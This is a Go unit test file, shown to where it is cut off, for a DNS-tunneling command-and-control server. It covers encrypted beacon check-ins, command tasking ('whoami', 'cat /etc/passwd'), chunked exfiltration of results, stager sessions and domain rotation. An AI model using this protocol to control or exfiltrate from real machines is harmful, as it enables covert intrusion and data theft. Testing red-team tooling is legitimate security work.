package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"strings"
	"testing"
	"time"
)

// =============================================================================
// Crypto Tests
// =============================================================================

func TestGenerateAESKey(t *testing.T) {
	key1 := generateAESKey("password123")
	key2 := generateAESKey("password123")
	key3 := generateAESKey("different")

	if string(key1) != string(key2) {
		t.Error("Same passphrase should generate same key")
	}

	if string(key1) == string(key3) {
		t.Error("Different passphrases should generate different keys")
	}

	if len(key1) != 32 {
		t.Errorf("Key length should be 32 bytes, got %d", len(key1))
	}
}

func TestBase36Encoding(t *testing.T) {
	data := []byte("Hello World")
	encoded := base36Encode(data)
	decoded, err := base36Decode(encoded)

	if err != nil {
		t.Fatalf("Failed to decode: %v", err)
	}

	if string(decoded) != string(data) {
		t.Errorf("Decoded data mismatch. Got %s, want %s", string(decoded), string(data))
	}
}

func TestBase36EncodingEmpty(t *testing.T) {
	data := []byte("")
	encoded := base36Encode(data)
	decoded, err := base36Decode(encoded)

	if err != nil {
		t.Fatalf("Failed to decode empty: %v", err)
	}

	if string(decoded) != string(data) {
		t.Errorf("Empty data mismatch")
	}
}

func TestBase36EncodingBinary(t *testing.T) {
	// Test with binary data including null bytes
	data := []byte{0x00, 0x01, 0x02, 0xFF, 0xFE, 0xFD}
	encoded := base36Encode(data)
	decoded, err := base36Decode(encoded)

	if err != nil {
		t.Fatalf("Failed to decode binary: %v", err)
	}

	if len(decoded) != len(data) {
		t.Errorf("Binary data length mismatch. Got %d, want %d", len(decoded), len(data))
	}

	for i := range data {
		if decoded[i] != data[i] {
			t.Errorf("Binary data mismatch at index %d. Got %d, want %d", i, decoded[i], data[i])
		}
	}
}

func TestEncryptDecrypt(t *testing.T) {
	key := generateAESKey("testkey")
	plaintext := "Secret Message"

	encrypted, err := encryptAndEncode(plaintext, key)
	if err != nil {
		t.Fatalf("Encryption failed: %v", err)
	}

	decrypted, err := decodeAndDecrypt(encrypted, key)
	if err != nil {
		t.Fatalf("Decryption failed: %v", err)
	}

	if decrypted != plaintext {
		t.Errorf("Decrypted text mismatch. Got %s, want %s", decrypted, plaintext)
	}
}

func TestEncryptDecryptLargeData(t *testing.T) {
	key := generateAESKey("testkey")
	// Create a large plaintext (simulating command output)
	plaintext := strings.Repeat("A", 10000)

	encrypted, err := encryptAndEncode(plaintext, key)
	if err != nil {
		t.Fatalf("Large encryption failed: %v", err)
	}

	decrypted, err := decodeAndDecrypt(encrypted, key)
	if err != nil {
		t.Fatalf("Large decryption failed: %v", err)
	}

	if decrypted != plaintext {
		t.Errorf("Large decrypted text length mismatch. Got %d, want %d", len(decrypted), len(plaintext))
	}
}

func TestEncryptDecryptWrongKey(t *testing.T) {
	key1 := generateAESKey("testkey1")
	key2 := generateAESKey("testkey2")
	plaintext := "Secret Message"

	encrypted, err := encryptAndEncode(plaintext, key1)
	if err != nil {
		t.Fatalf("Encryption failed: %v", err)
	}

	_, err = decodeAndDecrypt(encrypted, key2)
	if err == nil {
		t.Error("Decryption with wrong key should fail")
	}
}

// =============================================================================
// C2Manager Initialization Tests
// =============================================================================

func TestC2ManagerInit(t *testing.T) {
	c2 := NewC2Manager(true, "testkey", StagerJitter{JitterMinMs: 100, JitterMaxMs: 200}, ":memory:", "example.com")
	if c2 == nil {
		t.Fatal("Failed to create C2Manager")
	}

	if string(c2.domain) != "example.com" {
		t.Errorf("Domain mismatch. Got %s, want example.com", c2.domain)
	}

	if c2.db == nil {
		t.Error("Database should be initialized")
	}
}

func TestC2ManagerEncryptionKey(t *testing.T) {
	c2 := NewC2Manager(false, "mykey123", StagerJitter{}, ":memory:", "test.com")

	key := c2.GetEncryptionKey()
	if len(key) != 32 {
		t.Errorf("AES key should be 32 bytes, got %d", len(key))
	}

	// Test that the same key is always returned
	key2 := c2.GetEncryptionKey()
	if string(key) != string(key2) {
		t.Error("GetEncryptionKey should return consistent key")
	}
}

// =============================================================================
// Beacon/Client Tests
// =============================================================================

func TestBeaconRegistration(t *testing.T) {
	c2 := NewC2Manager(true, "testkey", StagerJitter{JitterMinMs: 100, JitterMaxMs: 200}, ":memory:", "example.com")

	// Simulate beacon checkin using pipe-delimited format: CHK|id|hostname|username|os|arch
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"

	// Encrypt beacon data
	encoded, err := encryptAndEncode(beaconData, c2.aesKey)
	if err != nil {
		t.Fatalf("Failed to encrypt beacon data: %v", err)
	}

	// Construct query name: encoded_payload.example.com
	qname := encoded + ".example.com"

	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)

	if !isC2 {
		t.Error("Should be identified as C2 traffic")
	}

	if resp != "ACK" {
		t.Errorf("Expected ACK response, got %s", resp)
	}

	// Verify beacon is registered
	beacons := c2.GetBeacons()
	if len(beacons) != 1 {
		t.Errorf("Expected 1 beacon, got %d", len(beacons))
	}

	if beacons[0].ID != "test-beacon" {
		t.Errorf("Beacon ID mismatch. Got %s, want test-beacon", beacons[0].ID)
	}
}

func TestBeaconRegistrationMultiple(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register multiple beacons
	beacons := []struct {
		id       string
		hostname string
		username string
		os       string
		arch     string
	}{
		{"beacon1", "host1", "user1", "linux", "amd64"},
		{"beacon2", "host2", "user2", "windows", "amd64"},
		{"beacon3", "host3", "user3", "darwin", "arm64"},
	}

	for _, b := range beacons {
		data := fmt.Sprintf("CHK|%s|%s|%s|%s|%s", b.id, b.hostname, b.username, b.os, b.arch)
		encoded, _ := encryptAndEncode(data, c2.aesKey)
		c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
	}

	registered := c2.GetBeacons()
	if len(registered) != 3 {
		t.Errorf("Expected 3 beacons, got %d", len(registered))
	}
}

func TestBeaconUpdateOnReconnect(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)

	// First check-in
	c2.processBeaconQuery(encoded+".example.com", "192.168.1.1", nil)

	beacons := c2.GetBeacons()
	firstSeen := beacons[0].FirstSeen
	firstIP := beacons[0].IPAddress

	// Wait a bit
	time.Sleep(10 * time.Millisecond)

	// Second check-in from different IP
	c2.processBeaconQuery(encoded+".example.com", "192.168.1.2", nil)

	beacons = c2.GetBeacons()
	if len(beacons) != 1 {
		t.Errorf("Should still have 1 beacon, got %d", len(beacons))
	}

	// FirstSeen should not change
	if beacons[0].FirstSeen != firstSeen {
		t.Error("FirstSeen should not change on reconnect")
	}

	// IP should be updated
	if beacons[0].IPAddress == firstIP {
		t.Error("IP address should be updated on reconnect")
	}

	// LastSeen should be updated
	if !beacons[0].LastSeen.After(firstSeen) {
		t.Error("LastSeen should be updated on reconnect")
	}
}

func TestTasking(t *testing.T) {
	c2 := NewC2Manager(true, "testkey", StagerJitter{JitterMinMs: 100, JitterMaxMs: 200}, ":memory:", "example.com")

	// Register beacon first using pipe-delimited format
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)

	// Add task
	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")

	// Poll for task (same check-in message)
	resp, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)

	// Response should be TASK|ID|COMMAND
	if len(resp) < 5 || resp[:5] != "TASK|" {
		t.Errorf("Expected TASK response, got %s", resp)
	}

	// Verify task is in response
	if !strings.Contains(resp, "whoami") {
		t.Errorf("Task response should contain command, got %s", resp)
	}
}

func TestTaskingMultiple(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)

	// Add multiple tasks
	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")
	c2.AddTaskFromMaster("T1002", "test-beacon", "id")
	c2.AddTaskFromMaster("T1003", "test-beacon", "pwd")

	// Helper: send RESULT_META to confirm task receipt and dequeue it.
	// Tasks stay in the queue until RESULT_META confirms the beacon received them.
	ackTask := func(taskID string) {
		meta := fmt.Sprintf("RESULT_META|test-beacon|%s|5|1|12345", taskID)
		enc, _ := encryptAndEncode(meta, c2.aesKey)
		c2.processBeaconQuery(enc+".example.com", "127.0.0.1", nil)
	}

	// First poll should get first task
	resp1, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
	if !strings.Contains(resp1, "whoami") {
		t.Errorf("First task should be whoami, got %s", resp1)
	}
	ackTask("T1001")

	// Second poll should get second task
	resp2, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
	if !strings.Contains(resp2, "id") {
		t.Errorf("Second task should be id, got %s", resp2)
	}
	ackTask("T1002")

	// Third poll should get third task
	resp3, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
	if !strings.Contains(resp3, "pwd") {
		t.Errorf("Third task should be pwd, got %s", resp3)
	}
	ackTask("T1003")

	// Fourth poll should get ACK (no more tasks)
	resp4, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
	if resp4 != "ACK" {
		t.Errorf("Fourth poll should get ACK, got %s", resp4)
	}
}

func TestTaskToUnknownBeacon(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Add task to non-existent beacon
	c2.AddTaskFromMaster("T1001", "unknown-beacon", "whoami")

	// The task should be stored but not deliverable
	beacons := c2.GetBeacons()
	if len(beacons) != 0 {
		t.Errorf("Should have no beacons, got %d", len(beacons))
	}
}

func TestResultMetaProcessing(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon and send task
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
	c2.AddTaskFromMaster("T1001", "test-beacon", "cat /etc/passwd")

	// Deliver task
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)

	// Send RESULT_META
	metaData := "RESULT_META|test-beacon|T1001|5000|10"
	metaEncoded, _ := encryptAndEncode(metaData, c2.aesKey)
	resp, isC2, _ := c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1", nil)

	if !isC2 {
		t.Error("RESULT_META should be recognized as C2 traffic")
	}

	if resp != "ACK" {
		t.Errorf("RESULT_META should get ACK, got %s", resp)
	}

	// Verify expected result is tracked
	c2.mutex.RLock()
	expected, exists := c2.expectedResults["T1001"]
	c2.mutex.RUnlock()

	if !exists {
		t.Error("Expected result should be tracked")
	}

	if expected.TotalChunks != 10 {
		t.Errorf("TotalChunks should be 10, got %d", expected.TotalChunks)
	}

	if expected.TotalSize != 5000 {
		t.Errorf("TotalSize should be 5000, got %d", expected.TotalSize)
	}
}

func TestDataChunkProcessing(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")

	// Deliver task
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)

	// Send result meta
	metaData := "RESULT_META|test-beacon|T1001|100|2"
	metaEncoded, _ := encryptAndEncode(metaData, c2.aesKey)
	c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1", nil)

	// Send DATA chunks (format: DATA|beaconID|taskID|chunkIndex|totalChunks|chunkData|timestamp)
	chunk1Data := base64.StdEncoding.EncodeToString([]byte("root"))
	dataMsg1 := fmt.Sprintf("DATA|test-beacon|T1001|1|1|%s|%d", chunk1Data, time.Now().Unix())
	data1Encoded, _ := encryptAndEncode(dataMsg1, c2.aesKey)
	resp1, isC2, _ := c2.processBeaconQuery(data1Encoded+".example.com", "127.0.0.1", nil)

	if !isC2 {
		t.Error("DATA should be recognized as C2 traffic")
	}

	if resp1 != "ACK" {
		t.Errorf("DATA chunk should get ACK, got %s", resp1)
	}
}

// =============================================================================
// Stager Tests
// =============================================================================

func TestStagerSessionCreation(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Test STG message parsing (without Master, should fail gracefully)
	stgData := "STG|192.168.1.100|linux|amd64"
	encoded := base36EncodeString(stgData)

	_, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "192.168.1.100", nil)

	// Without Master or cache, STG should return false (no cache available)
	// This is expected behavior
	if isC2 {
		t.Log("STG processed (cache available)")
	} else {
		t.Log("STG not processed (no cache, no Master) - expected")
	}
}

func TestStagerMessageParsing(t *testing.T) {
	// Test that STG messages are properly parsed
	testCases := []struct {
		msg      string
		valid    bool
		os       string
		arch     string
		clientIP string
	}{
		{"STG|192.168.1.1|linux|amd64", true, "linux", "amd64", "192.168.1.1"},
		{"STG|10.0.0.1|windows|x86", true, "windows", "x86", "10.0.0.1"},
		{"STG|172.16.0.1|darwin|arm64", true, "darwin", "arm64", "172.16.0.1"},
		{"STG|invalid", false, "", "", ""},
		{"STG", false, "", "", ""},
	}

	for _, tc := range testCases {
		parts := strings.Split(tc.msg, "|")
		valid := len(parts) >= 4 && parts[0] == "STG"

		if valid != tc.valid {
			t.Errorf("STG message '%s' validity mismatch. Got %v, want %v", tc.msg, valid, tc.valid)
		}

		if valid && tc.valid {
			if parts[2] != tc.os {
				t.Errorf("OS mismatch for '%s'. Got %s, want %s", tc.msg, parts[2], tc.os)
			}
			if parts[3] != tc.arch {
				t.Errorf("Arch mismatch for '%s'. Got %s, want %s", tc.msg, parts[3], tc.arch)
			}
		}
	}
}

func TestStagerChunkMessageParsing(t *testing.T) {
	// Test CHUNK message format
	testCases := []struct {
		msg       string
		valid     bool
		chunkIdx  string
		ip        string
		sessionID string
	}{
		{"CHUNK|0|192.168.1.1|stg_abcd", true, "0", "192.168.1.1", "stg_abcd"},
		{"CHUNK|10|10.0.0.1|session123", true, "10", "10.0.0.1", "session123"},
		{"CHUNK|invalid", false, "", "", ""},
		{"CHUNK", false, "", "", ""},
	}

	for _, tc := range testCases {
		parts := strings.Split(tc.msg, "|")
		valid := len(parts) >= 4 && parts[0] == "CHUNK"

		if valid != tc.valid {
			t.Errorf("CHUNK message '%s' validity mismatch. Got %v, want %v", tc.msg, valid, tc.valid)
		}

		if valid && tc.valid {
			if parts[1] != tc.chunkIdx {
				t.Errorf("ChunkIdx mismatch for '%s'. Got %s, want %s", tc.msg, parts[1], tc.chunkIdx)
			}
			if parts[2] != tc.ip {
				t.Errorf("IP mismatch for '%s'. Got %s, want %s", tc.msg, parts[2], tc.ip)
			}
			if parts[3] != tc.sessionID {
				t.Errorf("SessionID mismatch for '%s'. Got %s, want %s", tc.msg, parts[3], tc.sessionID)
			}
		}
	}
}

func TestDeterministicSessionID(t *testing.T) {
	// Test that session IDs are deterministic
	ip := "192.168.1.100"
	binaryID := "binary123"

	id1 := generateDeterministicSessionID(ip, binaryID)
	id2 := generateDeterministicSessionID(ip, binaryID)

	if id1 != id2 {
		t.Errorf("Session IDs should be deterministic. Got %s and %s", id1, id2)
	}

	// Different inputs should produce different IDs
	id3 := generateDeterministicSessionID("192.168.1.101", binaryID)
	if id1 == id3 {
		t.Error("Different IPs should produce different session IDs")
	}

	id4 := generateDeterministicSessionID(ip, "binary456")
	if id1 == id4 {
		t.Error("Different binary IDs should produce different session IDs")
	}

	// Should have stg_ prefix
	if !strings.HasPrefix(id1, "stg_") {
		t.Errorf("Session ID should have stg_ prefix, got %s", id1)
	}
}

// =============================================================================
// Exfil Tests
// =============================================================================

func TestExfilFrameProcessingNil(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Test nil frame handling
	ack, err := c2.ProcessExfilFrame(nil, "127.0.0.1")

	if ack {
		t.Error("Nil frame should not be acknowledged")
	}

	if err == nil {
		t.Error("Nil frame should return error")
	}
}

func TestExfilFrameInit(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Create init frame
	frame := &ExfilFrame{
		Phase:      ExfilFrameInit,
		SessionTag: "E01",
		Counter:    100, // total frames
		Flags:      FrameEnvelopeFlagInit,
	}

	ack, err := c2.ProcessExfilFrame(frame, "127.0.0.1")

	if err != nil {
		t.Errorf("Init frame should not error: %v", err)
	}

	if !ack {
		t.Error("Init frame should be acknowledged")
	}

	// Verify tracker was created
	tracker, ok := c2.getExfilTagTracker("E01")
	if !ok {
		t.Error("Tracker should be created for init frame")
	}

	if tracker.TotalFrames != 100 {
		t.Errorf("TotalFrames should be 100, got %d", tracker.TotalFrames)
	}
}

func TestExfilTagTracker(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Test tag normalization (should be uppercase)
	tag := "e01"
	now := time.Now()

	c2.mutex.Lock()
	tracker := c2.ensureExfilTagTrackerLocked(tag, now)
	c2.mutex.Unlock()

	if tracker == nil {
		t.Fatal("Tracker should be created")
	}

	// Retrieve with different case
	retrieved, ok := c2.getExfilTagTracker("E01")
	if !ok {
		t.Error("Should find tracker with uppercase tag")
	}

	// getExfilTagTracker returns a copy, so compare Tag values instead of pointers
	if retrieved.Tag != tracker.Tag {
		t.Errorf("Should return tracker with same tag, got %s vs %s", retrieved.Tag, tracker.Tag)
	}

	// Delete tracker
	c2.deleteExfilTagTracker(tag)

	_, ok = c2.getExfilTagTracker(tag)
	if ok {
		t.Error("Tracker should be deleted")
	}
}

func TestExfilSessionCreation(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	sessionID := "abcd1234"
	jobID := "job001"
	clientIP := "192.168.1.100"

	session := c2.ensureExfilSession(sessionID, jobID, clientIP)

	if session == nil {
		t.Fatal("Session should be created")
	}

	if session.SessionID != sessionID {
		t.Errorf("SessionID mismatch. Got %s, want %s", session.SessionID, sessionID)
	}

	if session.JobID != jobID {
		t.Errorf("JobID mismatch. Got %s, want %s", session.JobID, jobID)
	}

	if session.ClientIP != clientIP {
		t.Errorf("ClientIP mismatch. Got %s, want %s", session.ClientIP, clientIP)
	}

	if session.Status != "receiving" {
		t.Errorf("Status should be 'receiving', got %s", session.Status)
	}

	// Ensure returns same session
	session2 := c2.ensureExfilSession(sessionID, jobID, clientIP)
	if session != session2 {
		t.Error("Should return same session")
	}
}

func TestExfilCompletionFrameUnknownSession(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Try to complete unknown session
	ack, err := c2.handleExfilCompletionFrame("UNKNOWN")

	if ack {
		t.Error("Unknown session should not be acknowledged")
	}

	if err == nil {
		t.Error("Unknown session should return error")
	}
}

// =============================================================================
// DNS Parsing Tests
// =============================================================================

func TestBuildTXTRData(t *testing.T) {
	testCases := []struct {
		input    string
		expected int // expected length (including length prefix)
	}{
		{"", 1},            // Empty string = single zero byte
		{"ACK", 4},         // 3 chars + 1 length byte
		{"NACK", 5},        // 4 chars + 1 length byte
		{strings.Repeat("A", 255), 256}, // Max single segment
	}

	for _, tc := range testCases {
		result := buildTXTRData(tc.input)
		if len(result) != tc.expected {
			t.Errorf("buildTXTRData(%q) length = %d, want %d", tc.input, len(result), tc.expected)
		}

		// Verify format: first byte is length
		if tc.input != "" {
			if int(result[0]) != len(tc.input) {
				t.Errorf("buildTXTRData(%q) length prefix = %d, want %d", tc.input, result[0], len(tc.input))
			}
		}
	}
}

func TestBuildTXTRDataLong(t *testing.T) {
	// Test with data longer than 255 bytes (should be split)
	input := strings.Repeat("B", 300)
	result := buildTXTRData(input)

	// Should have 255-byte chunk + 45-byte chunk
	// First chunk: 1 (len) + 255 (data) = 256
	// Second chunk: 1 (len) + 45 (data) = 46
	// Total: 302
	expectedLen := 256 + 46
	if len(result) != expectedLen {
		t.Errorf("Long TXT data length = %d, want %d", len(result), expectedLen)
	}

	// First segment length should be 255
	if result[0] != 255 {
		t.Errorf("First segment length = %d, want 255", result[0])
	}

	// Second segment length should be 45
	if result[256] != 45 {
		t.Errorf("Second segment length = %d, want 45", result[256])
	}
}

func TestLabelsHaveSuffix(t *testing.T) {
	testCases := []struct {
		nameParts   []string
		domainParts []string
		expected    bool
	}{
		{[]string{"sub", "example", "com"}, []string{"example", "com"}, true},
		{[]string{"a", "b", "example", "com"}, []string{"example", "com"}, true},
		{[]string{"example", "com"}, []string{"example", "com"}, true},
		{[]string{"other", "com"}, []string{"example", "com"}, false},
		{[]string{"com"}, []string{"example", "com"}, false},
		{[]string{}, []string{"example", "com"}, false},
		{[]string{"sub", "example", "com"}, []string{}, false},
	}

	for _, tc := range testCases {
		result := labelsHaveSuffix(tc.nameParts, tc.domainParts)
		if result != tc.expected {
			t.Errorf("labelsHaveSuffix(%v, %v) = %v, want %v", tc.nameParts, tc.domainParts, result, tc.expected)
		}
	}
}

func TestIsBase36Label(t *testing.T) {
	testCases := []struct {
		label    string
		expected bool
	}{
		{"abc123", true},
		{"0", true},
		{"abcdefghijklmnopqrstuvwxyz0123456789", true},
		{"ABC", false},  // uppercase not allowed
		{"abc-123", false}, // hyphen not allowed
		{"abc.123", false}, // dot not allowed
		{"", false},
	}

	for _, tc := range testCases {
		result := isBase36Label(tc.label)
		if result != tc.expected {
			t.Errorf("isBase36Label(%q) = %v, want %v", tc.label, result, tc.expected)
		}
	}
}

func TestIsLikelyTimestampLabel(t *testing.T) {
	testCases := []struct {
		label    string
		expected bool
	}{
		{"1234567890", true},    // 10 digits - full unix timestamp
		{"12345678901", true},   // 11 digits - valid
		{"12345", true},         // 5 digits - new stager format (%05d of unix % 100000)
		{"00000", true},         // 5 digits with leading zeros
		{"1234", false},         // 4 digits - too short
		{"123456789012", false}, // 12 digits - too long
		{"12345678ab", false},   // contains letters
		{"", false},
	}

	for _, tc := range testCases {
		result := isLikelyTimestampLabel(tc.label)
		if result != tc.expected {
			t.Errorf("isLikelyTimestampLabel(%q) = %v, want %v", tc.label, result, tc.expected)
		}
	}
}

// =============================================================================
// Rate Limiter Tests
// =============================================================================

func TestForwardingRateLimiter(t *testing.T) {
	limiter := NewForwardingRateLimiter(5, 1) // 5 queries/sec, 1 sec pause

	// First 5 queries should be allowed
	for i := 0; i < 5; i++ {
		if !limiter.ShouldForward() {
			t.Errorf("Query %d should be allowed", i+1)
		}
	}

	// 6th query should trigger rate limit
	if limiter.ShouldForward() {
		t.Error("6th query should be rate limited")
	}

	// Should be paused
	if !limiter.IsPaused() {
		t.Error("Limiter should be paused")
	}

	// Wait for pause to expire
	time.Sleep(1100 * time.Millisecond)

	// Should be allowed again
	if !limiter.ShouldForward() {
		t.Error("Query should be allowed after pause expires")
	}
}

func TestForwardingRateLimiterStats(t *testing.T) {
	limiter := NewForwardingRateLimiter(3, 1)

	// Trigger rate limit
	for i := 0; i < 5; i++ {
		limiter.ShouldForward()
	}

	pauses, blocked, _ := limiter.GetStats()

	if pauses != 1 {
		t.Errorf("Should have 1 pause, got %d", pauses)
	}

	if blocked != 1 {
		t.Errorf("Should have 1 blocked query, got %d", blocked)
	}
}

// =============================================================================
// Known Domains Tests
// =============================================================================

func TestKnownDomains(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Initially empty
	domains := c2.GetKnownDomains()
	if len(domains) != 0 {
		t.Errorf("Should have no known domains initially, got %d", len(domains))
	}

	// Set domains
	newDomains := []string{"test1.com", "test2.com", "test3.com"}
	c2.SetKnownDomains(newDomains)

	domains = c2.GetKnownDomains()
	if len(domains) != 3 {
		t.Errorf("Should have 3 known domains, got %d", len(domains))
	}

	// Verify domains
	for i, d := range newDomains {
		if domains[i] != d {
			t.Errorf("Domain mismatch at %d. Got %s, want %s", i, domains[i], d)
		}
	}
}

// =============================================================================
// Domain Update Task Tests
// =============================================================================

func TestAddDomainUpdateTask(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)

	// Add domain update task
	taskID := c2.AddDomainUpdateTask("test-beacon", "update_domains:[\"new.com\"]")

	if taskID == "" {
		t.Error("Task ID should not be empty")
	}

	// Task ID should have D prefix
	if !strings.HasPrefix(taskID, "D") {
		t.Errorf("Domain task ID should have D prefix, got %s", taskID)
	}

	// Poll for task
	resp, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)

	if !strings.Contains(resp, "update_domains") {
		t.Errorf("Should receive domain update task, got %s", resp)
	}
}

// =============================================================================
// Integration Tests
// =============================================================================

func TestFullBeaconWorkflow(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// 1. Beacon registers
	beaconData := "CHK|workflow-beacon|workstation1|admin|windows|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	resp, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "10.0.0.50", nil)

	if !isC2 || resp != "ACK" {
		t.Fatalf("Registration failed: isC2=%v, resp=%s", isC2, resp)
	}

	// 2. Add task
	c2.AddTaskFromMaster("T2001", "workflow-beacon", "systeminfo")

	// 3. Beacon polls and gets task
	resp, _, _ = c2.processBeaconQuery(encoded+".example.com", "10.0.0.50", nil)
	if !strings.HasPrefix(resp, "TASK|") {
		t.Fatalf("Should get task, got %s", resp)
	}

	// 4. Beacon sends result metadata
	metaMsg := "RESULT_META|workflow-beacon|T2001|1000|3"
	metaEncoded, _ := encryptAndEncode(metaMsg, c2.aesKey)
	resp, _, _ = c2.processBeaconQuery(metaEncoded+".example.com", "10.0.0.50", nil)
	if resp != "ACK" {
		t.Fatalf("RESULT_META should get ACK, got %s", resp)
	}

	// 5. Beacon sends data chunks (format: DATA|beaconID|taskID|chunkIndex|totalChunks|chunkData|timestamp)
	totalChunks := 3
	for i := 0; i < totalChunks; i++ {
		chunkData := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("chunk%d", i)))
		chunkIndex := i + 1 // 1-indexed
		dataMsg := fmt.Sprintf("DATA|workflow-beacon|T2001|%d|%d|%s|%d", chunkIndex, totalChunks, chunkData, time.Now().Unix())
		dataEncoded, _ := encryptAndEncode(dataMsg, c2.aesKey)
		resp, _, _ = c2.processBeaconQuery(dataEncoded+".example.com", "10.0.0.50", nil)
		if resp != "ACK" {
			t.Fatalf("DATA chunk %d should get ACK, got %s", chunkIndex, resp)
		}
	}

	// 6. Beacon sends completion (format: RESULT_COMPLETE|id|taskID|totalChunks|timestamp)
	completeMsg := fmt.Sprintf("RESULT_COMPLETE|workflow-beacon|T2001|3|%d", time.Now().Unix())
	completeEncoded, _ := encryptAndEncode(completeMsg, c2.aesKey)
	resp, _, _ = c2.processBeaconQuery(completeEncoded+".example.com", "10.0.0.50", nil)
	if resp != "ACK" {
		t.Fatalf("RESULT_COMPLETE should get ACK, got %s", resp)
	}
}

func TestQueryNotForOurDomain(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Query for different domain
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)

	// Use different domain
	_, isC2, _ := c2.processBeaconQuery(encoded+".other.com", "127.0.0.1", nil)

	if isC2 {
		t.Error("Query for other domain should not be processed as C2")
	}
}

// TestBeaconCHKNotTreatedAsExfil verifies that beacon CHK queries are not
// incorrectly matched as exfil frames and NACKed. This was a bug where
// parseLabelEncodedExfilFrame returned matched=true for any query matching
// our domain, even if it wasn't an exfil frame (missing EX prefix).
func TestBeaconCHKNotTreatedAsExfil(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")
	domains := []string{"example.com"}

	// Create a beacon CHK query (encrypted, but NOT an exfil frame)
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, err := encryptAndEncode(beaconData, c2.aesKey)
	if err != nil {
		t.Fatalf("Failed to encrypt beacon data: %v", err)
	}

	qname := encoded + ".example.com"

	// Verify parseLabelEncodedExfilFrame returns matched=false for beacon queries
	// (they don't have the EX prefix, so shouldn't be treated as exfil)
	frame, matched, frameErr := parseLabelEncodedExfilFrame(qname, domains, c2.aesKey)
	if matched {
		t.Errorf("Beacon CHK query should NOT match as exfil frame, but matched=true (frame=%v, err=%v)", frame, frameErr)
	}

	// Verify the beacon query is correctly processed as C2 traffic
	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
	if !isC2 {
		t.Error("Beacon CHK query should be processed as C2 traffic")
	}
	if resp != "ACK" {
		t.Errorf("Beacon CHK should get ACK response, got: %s", resp)
	}
}

func TestInvalidPayload(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Random garbage that's not valid base36 or encrypted
	_, isC2, _ := c2.processBeaconQuery("notvalidpayload.example.com", "127.0.0.1", nil)

	if isC2 {
		t.Error("Invalid payload should not be processed as C2")
	}
}

// =============================================================================
// Payload Format & Beacon Name Tests
// =============================================================================

func TestStripDecorators(t *testing.T) {
	// Basic: extract X-position chars, skip decorators
